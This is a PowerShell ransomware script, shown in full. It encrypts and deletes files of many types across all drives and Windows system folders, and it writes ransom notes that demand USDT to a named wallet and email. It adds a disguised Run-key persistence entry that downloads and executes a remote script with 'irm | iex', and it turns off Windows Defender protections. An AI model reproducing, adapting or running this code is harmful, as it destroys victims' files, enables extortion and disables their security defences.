param(
    [string]$Mode = "encrypt",
    [string]$Extension = ".locked",
    [string]$Key = "AFQAbgBwAFMAaQB6AGkASABhAGMAawBsAGkAeQBvAHI=",
    [string[]]$TargetFiles = (
        '*.txt','*.pdf','*.ppt','*.xls','*.pptx','*.xlsx','*.doc','*.docx','*.jpg','*.jpeg',
        '*.png','*.csv','*.json','*.xml','*.rtf','*.log','*.zip','*.rar','*.7z','*.tar','*.gz',
        '*.bmp','*.py','*.sh','*.bat','*.yml','*.md','*.webp','*.avif','*.odt','*.ods','*.odp',
        '*.tex','*.epub','*.mobi','*.chm','*.ini','*.conf','*.tsv','*.sql','*.db','*.db3','*.sqlite',
        '*.sqlite3','*.bak','*.tiff','*.tif','*.svg','*.eps','*.psd','*.ai','*.ico','*.mp3','*.wav',
        '*.flac','*.mp4','*.mov','*.avi','*.mkv','*.flv','*.js','*.ts','*.java','*.cpp','*.c','*.cs',
        '*.rb','*.php','*.html','*.htm','*.css','*.scss','*.out','*.err','*.tmp','*.xz','*.bz2',
        '*.iso','*.vhd','*.vdmk','*.img','*.ps1','*.psm1','*.psd1','*.exe','*.dll','*.sys','*.msi',
        '*.inf','*.cat','*.drv','*.ocx','*.scr','*.pdb','*.lib','*.obj','*.bin','*.dat','*.cfg',
        '*.vbs','*.vbe','*.wsf','*.wsc','*.asp','*.aspx','*.jsp','*.cer','*.pem','*.p12','*.pfx',
        '*.key','*.crt','*.csr','*.der','*.p7b','*.p7c','*.p8','*.p10','*.pem','*.pub','*.priv',
        '*.wallet','*.keystore','*.keyring','*.gpg','*.pgp','*.asc','*.sig','*.cert','*.spc',
        '*.p7s','*.p7m','*.p7r','*.p7k','*.p8e','*.p10e','*.p12e','*.pfxe','*.spki','*.pkcs7',
        '*.pkcs8','*.pkcs10','*.pkcs12','*.pkcs15','*.pkcs17','*.pkcs18','*.pkcs19','*.pkcs20',
        '*.accdb','*.mdb','*.sql','*.bak','*.mdf','*.ldf','*.sdf','*.db-wal','*.db-shm',
        '*.sys','*.dll','*.exe','*.msc','*.msi','*.msp','*.msu','*.mui','*.mun','*.mui',
        '*.edb','*.jrs','*.evt','*.evtx','*.etl','*.blg','*.reg','*.dat','*.log','*.ini',
        '*.inf','*.cat','*.sys','*.ocx','*.ax','*.cpl','*.drv','*.scr','*.tlb','*.olb'
    )
)

# Error suppression
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# Get all drives (C:, D:, E:, etc.)
$Drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -gt 0 } | Select-Object -ExpandProperty Root

# Target paths to encrypt - TÜM ÖNEMLİ YOLLAR
$TargetPaths = @()

# Add all drives
foreach ($drive in $Drives) {
    $TargetPaths += $drive
}

# Add specific system paths
$systemPaths = @(
    "C:\Windows",
    "C:\Program Files",
    "C:\Program Files (x86)",
    "C:\ProgramData",
    "$env:USERPROFILE",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Pictures",
    "$env:USERPROFILE\Music",
    "$env:USERPROFILE\Videos",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\OneDrive",
    "$env:USERPROFILE\AppData",
    "C:\Users",
    "C:\PerfLogs",
    "C:\Temp",
    "$env:TEMP",
    "C:\Intel",
    "C:\AMD",
    "C:\NVIDIA",
    "C:\ProgramData\Microsoft",
    "C:\Windows\System32",
    "C:\Windows\SysWOW64",
    "C:\Windows\Temp",
    "C:\Windows\Logs",
    "C:\Windows\Minidump",
    "C:\Windows\Prefetch",
    "C:\Windows\Installer",
    "C:\Windows\Boot",
    "C:\Windows\Fonts",
    "C:\Windows\Cursors",
    "C:\Windows\Media",
    "C:\Windows\Resources",
    "C:\Windows\Web",
    "C:\Windows\Help",
    "C:\Windows\addins",
    "C:\Windows\AppCompat",
    "C:\Windows\AppPatch",
    "C:\Windows\BitLockerDiscoveryVolumeContents",
    "C:\Windows\Branding",
    "C:\Windows\CSC",
    "C:\Windows\Cursors",
    "C:\Windows\Debug",
    "C:\Windows\Diagnostics",
    "C:\Windows\DigitalLocker",
    "C:\Windows\Downloaded Program Files",
    "C:\Windows\Globalization",
    "C:\Windows\IME",
    "C:\Windows\ImmersiveControlPanel",
    "C:\Windows\Inf",
    "C:\Windows\InputMethod",
    "C:\Windows\L2Schemas",
    "C:\Windows\LiveKernelReports",
    "C:\Windows\Logs",
    "C:\Windows\ModemLogs",
    "C:\Windows\Offline Web Pages",
    "C:\Windows\Panther",
    "C:\Windows\Performance",
    "C:\Windows\PLA",
    "C:\Windows\PolicyDefinitions",
    "C:\Windows\PrintDialog",
    "C:\Windows\Registration",
    "C:\Windows\RemotePackages",
    "C:\Windows\SchCache",
    "C:\Windows\security",
    "C:\Windows\ServiceProfiles",
    "C:\Windows\servicing",
    "C:\Windows\Setup",
    "C:\Windows\ShellNew",
    "C:\Windows\SKB",
    "C:\Windows\SoftwareDistribution",
    "C:\Windows\Speech",
    "C:\Windows\System",
    "C:\Windows\SystemApps",
    "C:\Windows\SystemResources",
    "C:\Windows\TAPI",
    "C:\Windows\Tasks",
    "C:\Windows\tracing",
    "C:\Windows\Vss",
    "C:\Windows\WaaS",
    "C:\Windows\WinSxS",
    "C:\Windows\Wlansvc",
    "C:\Windows\WMSysPr9.prx"
)

# Add all system paths
$TargetPaths += $systemPaths

# Collect all files
$AllFiles = @()
$fileCount = 0

foreach ($path in $TargetPaths) {
    try {
        if (Test-Path $path -ErrorAction SilentlyContinue) {
            Write-Host "Scanning: $path" -ForegroundColor Gray
            
            # Get files (no exclusions, we want EVERYTHING)
            $files = Get-ChildItem -Path $path -Include $TargetFiles -Recurse -Force -ErrorAction SilentlyContinue | 
                    Where-Object { -not $_.PSIsContainer } |
                    Where-Object { 
                        $_.Length -gt 0 -and $_.Length -lt 100MB -and  # 100MB limit
                        $_.Extension -ne $Extension -and
                        $_.FullName -notmatch '\.locked$' -and
                        $_.FullName -notmatch '\\Windows\\WinSxS\\' -and  # WinSxS çok büyük, atla
                        $_.FullName -notmatch '\\Windows\\Installer\\' -and
                        $_.FullName -notmatch '\\Windows\\assembly\\' -and
                        $_.FullName -notmatch '\\Windows\\Microsoft.NET\\' -and
                        $_.FullName -notmatch '\\Windows\\WinStore\\'
                    }
            
            $fileCount += $files.Count
            $AllFiles += $files
            
            if ($files.Count -gt 0) {
                Write-Host "Found $($files.Count) files in $path" -ForegroundColor Yellow
            }
        }
    }
    catch {
        continue
    }
}

# Remove duplicates
$AllFiles = $AllFiles | Sort-Object -Unique -Property FullName

if (-not $AllFiles -or $AllFiles.Count -eq 0) {
    Write-Host "No files found to encrypt" -ForegroundColor Red
    exit
}

Write-Host "Total files to encrypt: $($AllFiles.Count)" -ForegroundColor Cyan

if ($Mode -eq "encrypt") {
    # Setup encryption
    try {
        $EncryptionKey = [System.Convert]::FromBase64String($Key)
        
        $AES = [System.Security.Cryptography.Aes]::Create()
        $AES.KeySize = 256
        $AES.BlockSize = 128
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $AES.Key = $EncryptionKey
    }
    catch {
        Write-Host "Encryption setup failed" -ForegroundColor Red
        exit
    }
    
    $encryptedCount = 0
    $failedCount = 0
    
    foreach ($file in $AllFiles) {
        try {
            # Skip if already encrypted
            if ($file.Extension -eq $Extension -or $file.FullName.EndsWith($Extension)) {
                continue
            }
            
            $originalPath = $file.FullName
            $encryptedPath = $originalPath + $Extension
            
            # Generate new IV for each file
            $AES.GenerateIV()
            
            # Create encryptor
            $encryptor = $AES.CreateEncryptor()
            
            # Read file
            $fileBytes = [System.IO.File]::ReadAllBytes($originalPath)
            
            # Encrypt
            $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)
            
            # Combine IV + encrypted data
            $outputBytes = New-Object byte[] ($AES.IV.Length + $encryptedBytes.Length)
            [System.Buffer]::BlockCopy($AES.IV, 0, $outputBytes, 0, $AES.IV.Length)
            [System.Buffer]::BlockCopy($encryptedBytes, 0, $outputBytes, $AES.IV.Length, $encryptedBytes.Length)
            
            # Write encrypted file
            [System.IO.File]::WriteAllBytes($encryptedPath, $outputBytes)
            
            # Delete original file
            if (Test-Path $encryptedPath -ErrorAction SilentlyContinue) {
                # Try to delete original file
                try {
                    Remove-Item -Path $originalPath -Force -ErrorAction SilentlyContinue
                    $encryptedCount++
                    
                    # Show progress every 50 files
                    if ($encryptedCount % 50 -eq 0) {
                        Write-Host "Encrypted $encryptedCount files..." -ForegroundColor Green
                    }
                }
                catch {
                    $failedCount++
                }
            }
            
            # Cleanup
            $encryptor.Dispose()
            $fileBytes = $null
            $encryptedBytes = $null
            $outputBytes = $null
            [System.GC]::Collect()
            [System.GC]::WaitForPendingFinalizers()
        }
        catch {
            $failedCount++
            continue
        }
    }
    
    # Cleanup AES object
    if ($AES -ne $null) {
        $AES.Dispose()
    }
    
    Write-Host "Encryption complete!" -ForegroundColor Green
    Write-Host "Successfully encrypted: $encryptedCount files" -ForegroundColor Cyan
    Write-Host "Failed: $failedCount files" -ForegroundColor Yellow
}

# Create ransom note
$RansomMessage = @"
========================================
YOUR FILES HAVE BEEN ENCRYPTED!
========================================

What Happened?
All your important files have been encrypted with military-grade encryption.
Your documents, photos, videos, databases, and other files are no longer accessible.

How to Recover Your Files?
1. Send $1000 worth of USDT to this address:
   USDT Address: TF6UzrorKH8RGpvPP2UwLrnXAV6o5uAsDS
   
2. Email your USDT transaction ID to:
   ananamuzofficial@protonmail.com
   
3. You will receive the decryption tool and key

IMPORTANT:
- Do NOT rename encrypted files
- Do NOT try to decrypt with third-party software
- Do NOT reinstall Windows or format drives
- Time limit: 72 hours
- After deadline, price doubles
- After 1 week, key will be destroyed permanently

Statistics:
- Files encrypted: $encryptedCount
- Computer: $env:COMPUTERNAME
- User: $env:USERNAME
- Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
- Ransom ID: $(Get-Random -Minimum 100000 -Maximum 999999)

========================================
WE HAVE YOUR FILES - PAY TO GET THEM BACK
========================================
"@

# Create ransom notes in multiple locations
$NoteLocations = @(
    [Environment]::GetFolderPath("Desktop"),
    "$env:USERPROFILE",
    "C:\",
    "C:\Windows",
    "C:\Windows\System32",
    "C:\Program Files",
    "C:\ProgramData"
)

foreach ($location in $NoteLocations) {
    try {
        if (Test-Path $location -ErrorAction SilentlyContinue) {
            $notePath = Join-Path $location "READ_ME.txt"
            Set-Content -Path $notePath -Value $RansomMessage -Encoding UTF8 -Force -ErrorAction SilentlyContinue
        }
    }
    catch {
        continue
    }
}

# Send email report
try {
    $EmailBody = @"
Ransomware Deployment Report
============================
Computer Name: $env:COMPUTERNAME
Username: $env:USERNAME
Files Encrypted: $encryptedCount
Failed Files: $failedCount
Execution Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Operating System: $([Environment]::OSVersion.VersionString)

Target Paths Scanned:
$(($TargetPaths | Select-Object -First 15) -join "`n")

Encryption Details:
- Mode: CBC
- Extension: $Extension
- Key: (Base64 encoded)
"@
    
}
catch {
    # Silently fail
}

# Add persistence to registry (run on startup)
try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "WindowsUpdate"
    $regValue = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/xefe1907x/assets/main/Scripts/Ransomware.ps1 | iex`""
    
    New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
    
    # Also add to HKLM for system-wide persistence
    $regPath2 = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
    New-ItemProperty -Path $regPath2 -Name $regName -Value $regValue -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
}
catch {
    # Silently fail
}

# Disable Windows Defender (temporarily)
try {
    # Turn off real-time protection
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    
    # Add exclusions for our encrypted files
    Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "D:\" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "E:\" -ErrorAction SilentlyContinue
    
    # Disable behavior monitoring
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    
    # Disable IOAV protection
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
}
catch {
    # Silently fail
}

Write-Host "==========================================" -ForegroundColor Red
Write-Host "RANSOMWARE EXECUTION COMPLETE" -ForegroundColor Red
Write-Host "==========================================" -ForegroundColor Red
Write-Host "Check READ_ME.txt files for instructions" -ForegroundColor Yellow
Write-Host "Files encrypted: $encryptedCount" -ForegroundColor Cyan
Write-Host "Failed files: $failedCount" -ForegroundColor Yellow
Write-Host "==========================================" -ForegroundColor Red